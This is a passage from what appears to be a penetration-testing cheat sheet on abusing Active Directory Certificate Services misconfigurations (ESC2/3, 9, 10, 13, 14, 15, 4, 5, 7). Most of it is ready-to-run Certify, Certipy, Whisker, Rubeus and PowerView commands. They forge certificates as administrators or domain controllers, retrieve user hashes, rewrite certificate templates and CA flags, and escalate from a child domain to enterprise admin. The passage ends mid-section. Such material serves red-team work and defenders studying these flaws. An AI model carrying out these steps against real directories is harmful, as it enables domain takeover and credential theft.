Certify.exe request /ca:CA.contoso.local\CA /template:User /onbehalfon:CONTOSO\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
</code></pre>
<h5 id="bkmrk-linux-2">Linux</h5>
<h6 id="bkmrk-esc1-%26-2-0">ESC1 &amp; 2</h6>
<pre id="bkmrk-%23-enumerate-and-save"><code class="language-bash"># enumerate and save text, json and bloodhound (original) outputs
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -old-bloodhound

# quickly spot vulnerable elements
certipy find -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout

#To specify a user account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'administrator@contoso.local'

#To specify a computer account in the SAN
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.contoso.local'
</code></pre>
<p id="bkmrk-if-any-eku-but-no-cl-0">If <strong>ANY EKU</strong> but no Client Authentication, it can be used as en <strong>ESC3</strong>.</p>
<h6 id="bkmrk-esc2-%26-3-0">ESC2 &amp; 3</h6>
<pre id="bkmrk-%23-request-a-certific"><code class="language-bash"># Request a certificate specifying the Certificate Request Agent EKU
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'

# Used issued certificate to request another certificate on behalf of another user
certipy req -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\domain admin' -pfx 'user.pfx'
</code></pre>
<h4 id="bkmrk-extension-misconfigu">Extension misconfiguration - ESC9 &amp; 10</h4>
<ul id="bkmrk-esc9-%3A-no-security-e"><li>
<strong>ESC9</strong> : No security extension, the certificate attribute <code>msPKI-Enrollment-Flag</code> contains the flag <code>CT_FLAG_NO_SECURITY_EXTENSION</code>
<ul><li>
<code>StrongCertificateBindingEnforcement</code> not set to <code>2</code> (default: <code>1</code>) or <code>CertificateMappingMethods</code> contains <code>UPN</code> flag (<code>0x4</code>)</li>
<li>The template contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value</li>
<li>The template specifies client authentication</li>
<li>
<code>GenericWrite</code> right against any account A to compromise any account B</li>
</ul></li>
<li>
<strong>ESC10</strong> : Weak certificate mapping
<ul><li>Case 1 : <code>StrongCertificateBindingEnforcement</code> set to <code>0</code>, meaning no strong mapping is performed
<ul><li>A template that specifiy client authentication is enabled</li>
<li>
<code>GenericWrite</code> right against any account A to compromise any account B</li>
</ul></li>
<li>Case 2 : <code>CertificateMappingMethods</code> is set to <code>0x4</code>, meaning no strong mapping is performed and only the UPN will be checked
<ul><li>A template that specifiy client authentication is enabled</li>
<li>
<code>GenericWrite</code> right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)</li>
</ul></li>
</ul></li>
</ul><h5 id="bkmrk-windows-3">Windows</h5>
<h6 id="bkmrk-esc9">ESC9</h6>
<p id="bkmrk-here%2C-user1-has-gene">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise <strong>user3</strong>. <strong>user2</strong> is allowed to enroll in a vulnerable template that specifies the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value.</p>
<pre id="bkmrk-%23retrieve-user2-cred"><code class="language-powershell">#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to user3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
#Request vulnerable certif with user2
Certify.exe request /ca:CA.contoso.local\CA /template:"Vulnerable template"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
#Authenticate with the certif and obtain user3 hash during UnPac the hash
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /show
</code></pre>
<h6 id="bkmrk-esc10---case-1">ESC10 - Case 1</h6>
<p id="bkmrk-here%2C-user1-has-gene-0">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise <strong>user3</strong>.</p>
<pre id="bkmrk-%23retrieve-user2-cred-0"><code class="language-powershell">#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to user3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
#Request authentication certif with user2
Certify.exe request /ca:CA.contoso.local\CA /template:"User"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
#Authenticate with the certif and obtain user3 hash during UnPac the hash
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /show
</code></pre>
<h6 id="bkmrk-esc10---case-2">ESC10 - Case 2</h6>
<p id="bkmrk-here%2C-user1-has-gene-1">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise the domain controller <strong>DC$@contoso.local</strong>.</p>
<pre id="bkmrk-%23retrieve-user2-cred-1"><code class="language-powershell">#Retrieve user2 creds via Shadow Credentials
Whisker.exe add /target:"user2" /domain:"contoso.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
#Change user2 UPN to DC$@contoso.local
Set-DomainObject user2 -Set @{'userPrincipalName'='DC$@contoso.local'} -Verbose
#Request authentication certif with user2
Certify.exe request /ca:CA.contoso.local\CA /template:"User"
#user2 UPN change back
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@contoso.local'} -Verbose
</code></pre>
<p id="bkmrk-now%2C-authentication-">Now, authentication with the obtained certificate will be performed through Schannel. It can be used to perform, for example, an RBCD.</p>
<h5 id="bkmrk-linux-3">Linux</h5>
<h6 id="bkmrk-esc9-0">ESC9</h6>
<p id="bkmrk-here%2C-user1-has-gene-2">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise <strong>user3</strong>. <strong>user2</strong> is allowed to enroll in a vulnerable template that specifies the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value.</p>
<pre id="bkmrk-%23retrieve-user2-cred-2"><code class="language-bash">#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to user3
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user3@contoso.local
#Request vulnerable certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate with the certif and obtain user3 hash during UnPac the hash
certipy auth -pfx 'user3.pfx' -domain 'contoso.local'
</code></pre>
<h6 id="bkmrk-esc10---case-1-0">ESC10 - Case 1</h6>
<p id="bkmrk-here%2C-user1-has-gene-3">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise <strong>user3</strong>.</p>
<pre id="bkmrk-%23retrieve-user2-cred-3"><code class="language-bash">#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to user3
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user3@contoso.local
#Request authentication certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate with the certif and obtain user3 hash during UnPac the hash
certipy auth -pfx 'user3.pfx' -domain 'contoso.local'
</code></pre>
<h6 id="bkmrk-esc10---case-2-0">ESC10 - Case 2</h6>
<p id="bkmrk-here%2C-user1-has-gene-4">Here, <strong>user1</strong> has <code>GenericWrite</code> against <strong>user2</strong> and want to compromise the domain controller <strong>DC$@contoso.local</strong>.</p>
<pre id="bkmrk-%23retrieve-user2-cred-4"><code class="language-bash">#Retrieve user2 creds via Shadow Credentials
certipy shadow auto -username 'user1@contoso.local' -p 'password' -account user2
#Change user2 UPN to DC$@contoso.local
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn 'DC$@contoso.local'
#Request authentication certif with user2
certipy req -username 'user2@contoso.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
#user2 UPN change back
certipy account update -username 'user1@contoso.local' -p 'password' -user user2 -upn user2@contoso.local
#Authenticate through Schannel to realise a RBCD in a LDAP shell
certipy auth -pfx dc.pfx -dc-ip 'DC_IP' -ldap-shell
</code></pre>
<h4 id="bkmrk-issuance-policiy-wit">Issuance policiy with privileged group linked - ESC13</h4>
<p id="bkmrk-issuance-policy-can-">Issuance policy can be added to certificate template in the <code>msPKI-Certificate-Policy</code> attribute. Issuing policies are <code>msPKI-Enterprise-Oid</code> objects found in the PKI OID container (<code>CN=OID,CN=Public Key Services,CN=Services</code>, in the Configuration Naming Context).</p>
<p id="bkmrk-this-object-has-an-m">This object has an <code>msDS-OIDToGroupLink</code> attribute which allows a policy to be linked to an AD group so that a system can authorise a user presenting the certificate as if he were a member of this group. As explained by<a href="https://twitter.com/Jonas_B_K"> Jonas Bülow Knudsen</a> <a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">here</a>.</p>
<h5 id="bkmrk-windows-4">Windows</h5>
<p id="bkmrk-identify-a-template-">Identify a template with an issuance policy.</p>
<pre id="bkmrk-get-adobject-%22cn%3D%27vu"><code class="language-powershell">Get-ADObject "CN='Vulnerable template',$TemplateContainer" -Properties msPKI-Certificate-Policy
</code></pre>
<p id="bkmrk-verify-if-an-interes">Verify if an interesting group is linked to this policy.</p>
<pre id="bkmrk-get-adobject-%22cn%3D%24po"><code class="language-powershell">Get-ADObject "CN=$POLICY_ID,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
</code></pre>
<p id="bkmrk-then-just-request-a-">Then just request a certificate from the template.</p>
<pre id="bkmrk-.%5Ccertify.exe-reques"><code class="language-powershell">.\Certify.exe request /ca:CA.contoso.local\CA01 /template:"Vulnerable template"
</code></pre>
<h5 id="bkmrk-linux-4">Linux</h5>
<p id="bkmrk-this-pr-on-certipy-p">This <a href="https://github.com/ly4k/Certipy/pull/196">PR</a> on Certipy permits to identify template with issuance policy, and which ones are linked to group.</p>
<pre id="bkmrk-certipy-find--u-%27use"><code class="language-bash">certipy find -u 'user1@contoso.local' -p 'password' -dc-ip 'DC_IP'
</code></pre>
<p id="bkmrk-then-just-request-a--0">Then just request a certificate from the template.</p>
<pre id="bkmrk-certipy-req--u-%27user-0"><code class="language-bash">certipy req -u 'user1@contoso.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Vulnerable template'
</code></pre>
<h4 id="bkmrk-weak-explicit-mappin">Weak explicit mapping - ESC14</h4>
<p id="bkmrk-theory-and-requireme">Theory and requirements for this privilege escalation technique are pretty complex, and it is mandatory to have strong knowledges about certificate mapping. I recommend you to read <a href="https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates#certificate-mapping">this page</a> first.</p>
<h5 id="bkmrk-detection">Detection</h5>
<ul id="bkmrk-check-for-sufficient"><li>Check for sufficient rights against <code>altSecurityIdentities</code> attributes:</li>
</ul><pre id="bkmrk-%23-get-the-aces-for-a"><code class="language-powershell"># Get the ACEs for a single object based on DistinguishedName
Get-WriteAltSecIDACEs -DistinguishedName "dc=contoso,dc=local"

# Get ACEs of all AD objects under domain root by piping them into Get-WriteAltSecIDACEs
Get-ADObject -Filter * -SearchBase "dc=contoso,dc=local" | Get-WriteAltSecIDACEs
</code></pre>
<pre id="bkmrk-dacledit.py--action-"><code class="language-bash">dacledit.py -action 'read' -principal 'controlled_object' -target 'target_object' 'contoso'/'user':'password'
</code></pre>
<ul id="bkmrk-check-for-weak-expli"><li>Check for weak explicit mapping</li>
</ul><pre id="bkmrk-get-altsecidmapping-"><code class="language-powershell">Get-AltSecIDMapping -SearchBase "CN=Users,DC=contoso,DC=local"
</code></pre>
<h5 id="bkmrk-esc14-a---write-acce">ESC14 A - Write access on altSecurityIdentities</h5>
<ul id="bkmrk-the-attacker-has-wri"><li>The attacker has write access to the <code>altSecurityIdentities</code> attribute of the <strong>target</strong>
</li>
<li>He can enrol on a certificate as the <strong>victim</strong> and create an explicit mapping for the <strong>target</strong> by modifying its <code>altSecurityIdentities</code> attribute and pointing it to the obtained certificate</li>
<li>The certificate can then be used to authenticate as the <strong>target</strong>
</li>
</ul><pre id="bkmrk-%23-obtain-a-first-cer"><code class="language-powershell"># Obtain a first certificate
Certify.exe request /ca:contoso\ca /template:Machine /machine

# Craft a X509IssuerSerialNumber mapping string
Get-X509IssuerSerialNumberFormat -SerialNumber $SERIAL_NUMBER -IssuerDistinguishedName $ISSUER_DN

# Add the string to the altSecurityIdentities attribute on the target
Add-AltSecIDMapping -DistinguishedName $TARGET_DN -MappingString $MAPPING_STRING
Get-AltSecIDMapping -DistinguishedName $TARGET_DN

# Use the previous certificate to authenticate as the target
</code></pre>
<h5 id="bkmrk-esc14-b---target-wit">ESC14 B - Target with X509RFC822 (email)</h5>
<ul id="bkmrk-the-target-has-an-ex"><li>The <strong>target</strong> has an explicit weak mapping of type <code>X509RFC822</code>
</li>
<li>The attacker can modify the <code>mail</code> attribute of the <strong>victim</strong> so that it matches the <code>X509RFC822</code> mapping of the <strong>target</strong>
</li>
<li>It is then possible to enroll on the certificate model with the <strong>victim</strong>, and use the certificate obtained to authenticate as the <strong>target</strong>
</li>
<li>The <strong>target</strong> is a user account</li>
<li>The <strong>target</strong> already has at least one <code>X509RFC822</code> mapping in <code>altSecurityIdentities</code>
</li>
<li>The attacker has write access to the <code>mail</code> attribute of the <strong>victim</strong>
</li>
<li>The certificate template shows <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code> and shows the attribute <code>CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL</code> in <code>msPKI-Certificate-Name-Flag</code>
</li>
<li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>
</li>
<li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>
</li>
</ul><pre id="bkmrk-%23-overwrite-the-mail"><code class="language-powershell"># Overwrite the mail attribute of the victim to match the X509RFC822 mapping of the target
$victim = [ADSI]"LDAP://$VICTIM_DN"
$victim.Properties["mail"].Value = $TARGET_EMAIL
$victim.CommitChanges()

# Request a certificate as the victim to authenticate as the target
Certify.exe request /ca:contoso\ca /template:$TEMPLATE_MAIL
</code></pre>
<h5 id="bkmrk-esc14-c---target-wit">ESC14 C - Target with X509IssuerSubject</h5>
<ul id="bkmrk-the-target-has-an-ex-0"><li>The <strong>target</strong> has an explicit weak mapping of type <code>X509IssuerSubject</code>
</li>
<li>The attacker can modify the <code>cn</code> or <code>dNSHostName</code> attribute of the <strong>victim</strong> to match the subject of the <code>X509IssuerSubject</code> mapping of the <strong>target</strong>
</li>
<li>It is then possible to enroll on the certificate template with the <strong>victim</strong>, and use the resulting certificate to authenticate as the <strong>target</strong>
</li>
<li>The <strong>target</strong> already has at least one <code>X509IssuerSubject</code> mapping in <code>altSecurityIdentities</code>
</li>
<li>If the <strong>victim</strong> is a user:
<ul><li>The attacker can modify the <code>cn</code> and <code>name</code> attributes of the <strong>victim</strong> (to change the <code>cn</code>, the <code>name</code> must match)</li>
<li>If the <strong>target</strong> is a user and the <code>X509IssuerSubject</code> mapping has the current value of the <code>cn</code> attribute of the <strong>target</strong> as its identifier, the <strong>victim</strong> and the <strong>target</strong> cannot be in the same container (the DC will not allow the <code>cn</code> of the victim to be set according to the <code>cn</code> of the target if they are in the same container, as this would mean that they have the same <code>distinguishedName</code>)</li>
</ul></li>
<li>If the <strong>victim</strong> is a machine: the attacker has write access to the <code>dNSHostName</code> attribute</li>
<li>The certificate template indicates <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code> (except for Schannel authentication with the DC having the <code>CertificateMappingMethods</code> key set to <code>0x1</code>)</li>
<li>The template has one of the following flags in <code>msPKI-Certificate-Name-Flag</code>: <code>CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME</code> or <code>CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN</code>
</li>
<li>The certificate does not have any of the following flags: <code>CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH</code> and <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code>
</li>
<li>The enterprise PKI is the issuer referenced by <code>IssuerName</code> in the <code>X509IssuerSubject</code> mapping of the <strong>target</strong>
</li>
<li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>
</li>
<li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>, or <code>CertificateMappingMethods</code> is set to <code>0x1</code>
</li>
</ul><pre id="bkmrk-%23-overwrite-the-cn-a"><code class="language-powershell"># Overwrite the cn attribute of the victim to be equal to target.contoso.local
$victim = [ADSI]"LDAP://CN=$VICTIM,CN=Users,DC=contoso,DC=local"
$victim.Rename("CN=$TARGET.contoso.local")
Get-ADUser $VICTIM

# Request a certificate as the victim to authenticate as the target
Certify.exe request /ca:contoso\ca /template:$TEMPLATE
</code></pre>
<h5 id="bkmrk-esc14-d---target-wit">ESC14 D - Target with X509SubjectOnly</h5>
<ul id="bkmrk-the-target-has-an-ex-1"><li>The <strong>target</strong> has an explicit weak mapping of type <code>X509SubjectOnly</code>
</li>
<li>The attacker can modify the <code>cn</code> or <code>dNSHostName</code> attribute of the <strong>victim</strong> to match the subject of the <code>X509SubjectOnly</code> mapping of the <strong>target</strong>
</li>
<li>It is then possible to enroll on the certificate template with the <strong>victim</strong>, and use the resulting certificate to authenticate as the <strong>target</strong>
</li>
<li>The <strong>target</strong> already has at least one <code>X509SubjectOnly</code> mapping in <code>altSecurityIdentities</code>
</li>
<li>If the <strong>victim</strong> is a user:
<ul><li>The attacker can modify the <code>cn</code> and <code>name</code> attributes of the <strong>victim</strong> (to change the <code>cn</code>, the <code>name</code> must match)</li>
<li>If the <strong>target</strong> is a user and the <code>X509SubjectOnly</code> mapping has the current value of the <code>cn</code> attribute of the <strong>target</strong> as its identifier, the <strong>victim</strong> and the <strong>target</strong> cannot be in the same container (the DC will not allow the <code>cn</code> of the victim to be set according to the <code>cn</code> of the target if they are in the same container, as this would mean that they have the same <code>distinguishedName</code>)</li>
</ul></li>
<li>If the <strong>victim</strong> is a machine: the attacker has write access to the <code>dNSHostName</code> attribute</li>
<li>The certificate template indicates <code>CT_FLAG_NO_SECURITY_EXTENSION</code> in <code>msPKI-Enrollment-Flag</code>
</li>
<li>The template has one of the following flags in <code>msPKI-Certificate-Name-Flag</code>: <code>CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME</code> or <code>CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN</code>
</li>
<li>The certificate does not have any of the following flags: <code>CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH</code> and <code>CT_FLAG_SUBJECT_REQUIRE_EMAIL</code>
</li>
<li>For PKINIT, <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>
</li>
<li>For Schannel, <code>CertificateMappingMethods</code> indicates <code>0x8</code> and <code>StrongCertificateBindingEnforcement</code> is set to <code>0</code> or <code>1</code>
</li>
</ul><pre id="bkmrk-%23-overwrite-the-cn-a-0"><code class="language-powershell"># Overwrite the cn attribute of the victim to be equal to target.contoso.local
$victim = [ADSI]"LDAP://CN=$VICTIM,CN=Computers,DC=contoso,DC=local"
$victim.Properties["dNSHostName"].Value = $TARGET
$victim.CommitChanges()

# Request a certificate as the victim to authenticate as the target
Certify.exe request /ca:contoso\ca /template:$TEMPLATE /machine
</code></pre>
<h4 id="bkmrk-arbitrary-applicatio">Arbitrary application policy - ESC15 (CVE-2024-49019)</h4>
<ul id="bkmrk-https%3A%2F%2Fwww.thehacke"><li>
<a href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc15-cve-2024-49019-arbitrary-application-policy">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc15-cve-2024-49019-arbitrary-application-policy</a>
</li>
</ul><pre id="bkmrk-%23-request-a-certific-0"><code class="language-bash"># Request a certificate with "Certificate Request Agent" application policy
certipy req -u user1@contoso.local -p 'password' --application-policies "1.3.6.1.4.1.311.20.2.1" -ca 'ca_name' -template 'vulnerable template' -dc-ip 'DC_IP'

# Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
certipy req -u user1@contoso.local -p 'password' -on-behalf-of domain\\Administrator -template User -ca 'ca_name' -pfx cert.pfx -dc-ip 'DC_IP'

# Authenticate with the last certificate
certipy auth -pfx administrator.pfx -dc-ip 'DC_IP'
</code></pre>
<h3 id="bkmrk-access-controls-atta">Access Controls Attacks - ESC4, 5, 7</h3>
<h4 id="bkmrk-sufficient-rights-ag">Sufficient rights against a template - ESC4</h4>
<ul id="bkmrk-https%3A%2F%2Fgithub.com%2Fd"><li>
<a href="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates">https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates</a>
</li>
<li>
<a href="https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4">https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4</a>
</li>
</ul><ol id="bkmrk-get-enrollment-right"><li>Get Enrollment rights for the vulnerable template</li>
<li>Disable <code>PEND_ALL_REQUESTS</code> flag in <code>mspki-enrollment-flag</code> for disabling Manager Approval</li>
<li>Set <code>mspki-ra-signature</code> attribute to <code>0</code> for disabling Authorized Signature requirement</li>
<li>Enable <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag in <code>mspki-certificate-name-flag</code> for specifying high privileged account name as a SAN</li>
<li>Set <code>mspki-certificate-application-policy</code> to a certificate purpose for authentication
<ul><li>Client Authentication (OID: <code>1.3.6.1.5.5.7.3.2</code>)</li>
<li>Smart Card Logon (OID: <code>1.3.6.1.4.1.311.20.2.2</code>)</li>
<li>PKINIT Client Authentication (OID: <code>1.3.6.1.5.2.3.4</code>)</li>
<li>Any Purpose (OID: <code>2.5.29.37.0</code>)</li>
<li>No EKU</li>
</ul></li>
<li>Request a high privileged certificate for authentication and perform Pass-The-Ticket attack</li>
</ol><h5 id="bkmrk-windows-5">Windows</h5>
<pre id="bkmrk-%23-add-certificate-en"><code class="language-powershell"># Add Certificate-Enrollment rights
Add-DomainObjectAcl -TargetIdentity templateName -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=contoso,DC=local" -Verbose

# Disabling Manager Approval Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity tempalteName -XOR @{'mspki-enrollment-flag'=2} -Verbose

# Disabling Authorized Signature Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-ra-signature'=0} -Verbose

# Enabling SAN Specification
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -XOR @{'mspki-certificate-name-flag'=1} -Verbose

# Editting Certificate Application Policy Extension
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
</code></pre>
<h5 id="bkmrk-linux-5">Linux</h5>
<ul id="bkmrk-quick-override-and-r"><li>Quick override and restore</li>
</ul><pre id="bkmrk-%23-overwrite-the-cert"><code class="language-bash"># Overwrite the certificate template and save the old configuration
certipy template -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -template templateName -save-old

# After the ESC1 attack, restore the original configuration
certipy template -u 'user@contoso.local' -p 'password' -dc-ip 'DC_IP' -template templateName -configuration 'templateName.json'
</code></pre>
<ul id="bkmrk-precise-modification"><li>Precise modification</li>
</ul><pre id="bkmrk-%23-query-a-certificat"><code class="language-bash"># Query a certificate template (all attributes)
python3 modifyCertTemplate.py -template templateName contoso.local/user:pass

# Query the raw values of all template attributes
python3 modifyCertTemplate.py -template templateName -raw contoso.local/user:pass

# Query the ACL for a certificate template
python3 modifyCertTemplate.py -template templateName -get-acl contoso.local/user:pass


# Disabling Manager Approval Requirement
python3 modifyCertTemplate.py -template templateName -value 2 -property mspki-enrollment-flag contoso.local/user:pass 

# Disabling Authorized Signature Requirement
python3 modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature contoso.local/user:pass 

# Enabling SAN Specification
python3 modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag contoso.local/user:pass 

# Editting Certificate Application Policy Extension
python3 modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy contoso.local/user:pass 
</code></pre>
<h4 id="bkmrk-sufficient-rights-ag-0">Sufficient rights against several objects - ESC5</h4>
<ul id="bkmrk-ca-server%E2%80%99s-ad-compu"><li>CA server’s AD computer object (i.e., compromise through RBCD)</li>
<li>The CA server’s RPC/DCOM server</li>
<li>Any descendant AD object or container in the container <code>CN=Public Key Services,CN=Services,CN=Configuration,DC=&lt;COMPANY&gt;,DC=&lt;COM&gt;</code> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services container, etc.)</li>
</ul><p id="bkmrk-for-more-explains%2C-t">For more explains, take a look at this <a href="https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c">blog post</a> and <a href="https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/">this one</a>.</p>
<p id="bkmrk-in-an-ad%2C-the-config">In an AD, the <code>Configuration naming context</code> object is duplicated between all the writable DC of the forest, and any changes made by a DC in this object in its local copy are automatically propagated to all the other DC, including the DC of the root domain.</p>
<p id="bkmrk-the-system-user-on-t"><em>The SYSTEM user on the child domain’s domain controller has full control of some objects in the domain-local copy of the forest root domain’s Configuration naming context.</em></p>
<p id="bkmrk-in-particular%2C-it-ha">In particular, it has <strong>Full Control</strong> over the <strong>Certificate Templates container</strong>, meaning that it can add new (vulnerable) certificate templates, that will be replicated to the <code>Configuration naming context</code> on the root domain controller. Then, it also has <strong>Full Control</strong> over the <strong>Enrollment Services container</strong>, where the published templates are stored.</p>
<p id="bkmrk-so-the-privesc-from-">So the privesc from DA in a child domain to EA in the root domain is quit straightforward:</p>
<ul id="bkmrk-after-the-takeover-o"><li>After the takeover of the child domain, open a RDP session on the domain controller as an administrator</li>
<li>Open a PowerShell session as SYSTEM (for example with PsExec)</li>
<li>Launch <code>certtmpl.msc</code> as SYSTEM and duplicate an existing template. In the properties, make it vulnerable to ESC1</li>
<li>Launch <code>certsrv.msc</code> as SYSTEM and publish the newly created template
<ul><li>As another way, access the ADSI Edit as SYSTEM (via MMC) and add the new template to the <code>certificateTemplates</code> property of the <strong>Enrollment Services container</strong>
</li>
</ul></li>
<li>Finally, perform the ESC1 attack with Certify of Certipy</li>
</ul><h4 id="bkmrk-sufficient-rights-ag-1">Sufficient rights against the CA - ESC7</h4>
<ul id="bkmrk-https%3A%2F%2Fppn.snovvcra"><li>
<a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7</a>
</li>
</ul><h5 id="bkmrk-windows-6">Windows</h5>
<ul id="bkmrk-if-an-attacker-gains"><li>
<em>If an attacker gains control over a principal that has the <strong>ManageCA</strong> right over the CA, he can remotely flip the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> bit to allow SAN specification in any template</em>
</li>
</ul><pre id="bkmrk-%23-if-rsat-is-not-pre"><code class="language-powershell"># If RSAT is not present on the machine
DISM.exe /Online /Get-Capabilities
DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~~~~0.0.1.0

# Install PSPKI
Install-Module -Name PSPKI
Import-Module PSPKI
PSPKI &gt; Get-CertificationAuthority -ComputerName CA.contoso.local | Get-CertificationAuthorityAcl | select -ExpandProperty access

$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "CA.contoso.com"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
